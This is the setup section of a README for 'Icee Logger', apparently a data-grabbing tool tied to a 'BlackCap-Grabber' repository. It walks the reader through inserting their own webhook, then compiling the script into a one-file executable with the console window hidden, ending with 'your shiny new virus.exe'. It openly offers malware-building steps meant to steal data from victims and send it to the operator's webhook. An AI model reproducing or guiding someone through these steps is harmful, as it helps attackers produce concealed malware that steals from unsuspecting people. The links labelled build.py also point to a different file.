## <a id="setup"></a> ⚙️ 〢 Setting up Icee Logger

1. Install [Python](https://www.python.org/downloads/)
2. Install auto_py_to_exe. To do that please open a command prompt and execute the following code: `pip install auto_py_to_exe`. Please make sure you have both Python and pip installed on your device.
3. Open [build.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat) with nodepad. (Or any other text editor you are comfortable with.)
4. Paste your Webhook inside the `""` where it says `Webhook = "PASTE_YOUR_WEBHOOK_HERE"`. Remember that you don't need to delete the `""` and that your webhook link should be inside them.
5. Open a command prompt window again.
6. Execute the following code: `python -m auto_py_to_exe`.
7. Click on "Browse" and select [build.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat). *Don't forget to complete step 3 first!*
8. Please select the following settings:
    - OneFile - One File
    - Console Window - Window Based (hide the console)
9. Click on "CONVERT .PY TO .EXE"
10. Make sure not to close anything while the file is being converted!
11. Once it's done open the "output" folder and you will see your shiny new virus.exe! ***(You can now close the Cmd Prompt and Auto Py To Exe)***
12. You have your .exe file now! Enjoy :)
